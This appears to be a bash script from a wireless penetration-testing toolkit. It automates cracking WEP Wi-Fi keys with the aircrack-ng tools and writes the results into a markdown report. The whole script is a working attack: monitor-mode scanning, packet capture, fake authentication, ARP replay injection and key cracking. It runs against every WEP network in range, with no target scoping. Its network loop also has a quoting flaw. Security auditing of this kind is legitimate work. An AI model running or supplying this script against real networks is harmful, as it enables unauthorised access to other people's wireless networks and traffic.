#!/bin/bash

if [[ $# -ne 2 ]]; then
	echo "Syntax : $0 testname interface"
	exit 1
fi

./switch_led.sh on
filename=$1/$(basename -- $0 .sh).md
tmppath=$1/tmp/wep
status=1

echo '# WEP crack' > $filename
echo >> $filename
echo '## Vulnerability' >> $filename
echo >> $filename
echo '## Exploit' >> $filename
echo >> $filename
echo '## Countermeasure' >> $filename
echo >> $filename
echo '## Test results' >> $filename
echo '```' >> $filename

mkdir -p $tmppath/ap
cnt=0

#Monitor mode
#airmon-ng stop $2'mon' &> /dev/null
airmon-ng start $2 &> /dev/null

#Scan
airodump-ng -t WEP -w $tmppath/out -o csv $2'mon' &> /dev/null & PID=$!
sleep 30
kill -13 $PID &> /dev/null
cat $tmppath/out-01.csv | grep 'WEP' >> $filename

#Extracting
bssids_channels=$(grep "WEP" $tmppath/out-01.csv | cut -d , -f 1,4,14)
if [[ -z "$bssids_channels" ]]; then
	echo 'No WEP networks detected' >> $filename
else
	for i in "$bssids_channels"
	do
		((cnt++))
		#Capturing IVs
		airodump-ng --bssid $(echo $i | cut -d , -f 1) -w $tmppath/ap/ap_$cnt -o pcap -c $(echo $i | cut -d , -f 2) $2'mon' &> /dev/null & PIDdump=$!
		#Fake authentication
		aireplay-ng -1 0 -a $(echo $i | cut -d , -f 1) $2'mon' &> /dev/null
		#ARP requesting in replay mode
		aireplay-ng -3 -b $(echo $i | cut -d , -f 1) $2'mon' &> /dev/null & PIDreplay=$!
		#Logging
		echo $(echo $i | cut -d , -f 3): >> $filename
		#Cracking
		sleep 10
		aircrack-ng -q -b $(echo $i | cut -d , -f 1) $tmppath/ap/ap_$cnt-01.cap &>> $filename
		status=$?
		kill -13 $PIDdump &> /dev/null
		kill -13 $PIDreplay &> /dev/null
	done
fi
airmon-ng stop $2'mon' &> /dev/null

echo '```' >> $filename
if [[ $status = 0 ]]; then
	echo '**WEP crack complete!**' >> $filename
else
	echo '**WEP crack NOT complete!**' >> $filename
fi
echo >> $filename
echo '---' >> $filename

./switch_led.sh off
exit $status

